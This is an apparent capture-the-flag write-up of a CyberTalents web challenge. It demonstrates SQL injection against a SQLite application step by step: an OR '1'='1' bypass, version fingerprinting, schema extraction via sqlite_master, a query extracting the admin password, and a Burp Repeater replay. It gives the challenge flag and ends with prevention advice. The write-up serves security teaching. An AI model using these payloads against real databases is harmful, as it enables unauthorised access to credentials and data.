# Share the Ideas - CyberTalents

---

## Challenge Description
**Can you reveal the admin password?**

## Challenge Link
https://cybertalents.com/challenges/web/share-ideas

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="692" height="350" alt="image" src="https://github.com/user-attachments/assets/4f0ed8c3-ed7e-4267-ae1a-5ef751a65d66" />
</p>

---

## 2. Challenge Page

Upon navigating to the challenge URL, a web application is presented. The application appears to accept user input, making it a candidate for injection-based attacks.

<p align="center">
<img width="959" height="538" alt="image" src="https://github.com/user-attachments/assets/d96e1207-5db7-4686-8f61-3c1e655b221c" />
</p>

---

## 3. Source Code Analysis

Inspecting the page source reveals how the application handles user input and communicates with the backend database. No sanitisation or parameterised queries are observed, indicating a potential SQL injection vulnerability.

<p align="center">
<img width="935" height="364" alt="image" src="https://github.com/user-attachments/assets/1845632d-eeb4-48f7-9b19-47dffc3a9396" />
</p>

---

## 4. Identifying the Input Field

A user input field is identified within the application. This is the target for SQL injection testing.

<p align="center">
<img width="541" height="255" alt="image" src="https://github.com/user-attachments/assets/ceece758-4736-4da1-b8eb-39e6d07d71e1" />
</p>

---

## 5. Confirming the Injection Point

Initial observations of the application's response behaviour confirm that user input is being passed directly into a SQL query without proper sanitisation.

<p align="center">
<img width="915" height="280" alt="image" src="https://github.com/user-attachments/assets/6973671d-5cdc-490d-845b-26daf5b87124" />
</p>

---

## 6. Enumerating the Application

Further interaction with the application is performed to understand its structure and confirm the presence of a SQL injection vulnerability before exploitation.

<p align="center">
<img width="944" height="428" alt="image" src="https://github.com/user-attachments/assets/52d72f11-3e45-4105-888f-2b476543d50f" />
</p>

---

## 7. Testing SQL Injection — Basic Authentication Bypass

A classic SQL injection payload is submitted to confirm the vulnerability:

```sql
' OR '1'='1'
```

**How it works:**

The original query likely looks like this:

```sql
SELECT * FROM users WHERE input = '[user input]';
```

By injecting `' OR '1'='1'`, the query becomes:

```sql
SELECT * FROM users WHERE input = '' OR '1'='1';
```

Since `'1'='1'` is always `true`, the `WHERE` condition is bypassed and the query returns data — confirming the injection point is exploitable.

<p align="center">
<img width="414" height="149" alt="image" src="https://github.com/user-attachments/assets/6ccb2c26-0ea1-474d-a30f-18f7c93222a9" />
</p>

<p align="center">
<img width="942" height="311" alt="image" src="https://github.com/user-attachments/assets/a7293b27-e5db-4a27-a5ba-0e4532a49754" />
</p>

---

## 8. Fingerprinting the Database — SQLite Version

To identify the database engine, the following payload is injected:

```sql
' || (select sqlite_version()));--
```

**How it works:**

| Part | Meaning |
|------|---------|
| `'` | Closes the original string in the query |
| `\|\|` | String concatenation operator in SQLite |
| `(select sqlite_version())` | Subquery that returns the SQLite version number |
| `));--` | Closes any open brackets and comments out the rest of the query |

The response reveals the SQLite version, confirming the backend is **SQLite** — which is important as it determines which payloads and functions can be used next.

<p align="center">
<img width="938" height="310" alt="image" src="https://github.com/user-attachments/assets/2f7f9c6c-12da-46e8-9d7b-d6a129b8dff0" />
</p>

---

## 9. Extracting the Database Schema

To discover what tables and columns exist in the database, the following payload is used:

```sql
' || (SELECT sql FROM sqlite_master));--
```

**How it works:**

| Part | Meaning |
|------|---------|
| `sqlite_master` | A special built-in SQLite table that stores the schema of all tables |
| `sql` | A column in `sqlite_master` that contains the `CREATE TABLE` statement for each table |

The response reveals the full schema, including the table name **`xde43_users`** and its columns — one of which is **`password`** and another is **`role`**.

<p align="center">
<img width="937" height="305" alt="image" src="https://github.com/user-attachments/assets/ecca7384-351c-44fd-b90f-6d294b8a2067" />
</p>

---

## 10. Extracting the Admin Password — Flag Obtained

With the table structure known, the admin password is extracted directly using:

```sql
' || (select password from xde43_users where role="admin"));--
```

**How it works:**

| Part | Meaning |
|------|---------|
| `select password` | Retrieves the `password` column |
| `from xde43_users` | From the discovered user table |
| `where role="admin"` | Filters specifically for the admin account |

The server returns the admin password, which is the flag:

> **FLAG: `flag245698`**

<p align="center">
<img width="958" height="286" alt="image" src="https://github.com/user-attachments/assets/57036fd5-386c-4cb9-a5f2-9e024f05a521" />
</p>

---

# Burp Suite Analysis

---

## 11. Intercepting and Replaying the Injection via Burp Suite

The same SQL injection payload is replicated using Burp Suite's **Repeater** tool. Since the injection is sent via a URL (GET request), spaces in the payload must be URL-encoded. In this context, **`+`** is used as a substitute for spaces, as it is a valid URL-encoded space character.

For example:
```
'+||+(select+password+from+xde43_users+where+role="admin"));--
```

The modified request is sent via Repeater and the server responds with the same admin password, confirming the vulnerability is fully exploitable via HTTP request manipulation.

<p align="center">
<img width="743" height="368" alt="image" src="https://github.com/user-attachments/assets/3eaa2aa8-d515-42fa-bd85-d672db9a79e0" />
</p>

---

# OWASP Classification

This vulnerability falls under:

> **OWASP Top 10: A03 — Injection**

SQL Injection occurs when user-supplied input is incorporated into a database query without proper sanitisation or parameterisation, allowing attackers to manipulate the query logic and access unauthorised data.

---

# Why This Is a Security Issue

The application passes user input directly into SQL queries without any sanitisation. This allows an attacker to:

- Bypass authentication entirely using boolean-based payloads
- Enumerate the database engine and version
- Extract the full database schema including table and column names
- Retrieve sensitive data such as passwords directly from the database

---

# Exploitation Flow (OWASP A03 Mapping)

1. Attacker identifies a user input field in the application
2. A basic `OR '1'='1'` payload confirms the SQL injection vulnerability
3. `sqlite_version()` is queried to fingerprint the database engine as SQLite
4. `sqlite_master` is queried to extract the full database schema
5. The `xde43_users` table and `password` / `role` columns are discovered
6. A targeted query extracts the admin password directly
7. Flag is revealed: `flag245698`

---

# Conclusion

This challenge demonstrates **OWASP A03: Injection**, specifically SQL Injection against a SQLite backend. The absence of input sanitisation and parameterised queries allowed full database enumeration and sensitive data extraction using progressively refined payloads.

To prevent SQL Injection, applications must always use **prepared statements** (parameterised queries), **input validation**, and follow the principle of **least privilege** for database accounts.
